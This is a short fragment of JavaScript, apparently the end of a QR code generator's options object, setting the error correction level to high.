correctLevel: QRCode.CorrectLevel.H
});
 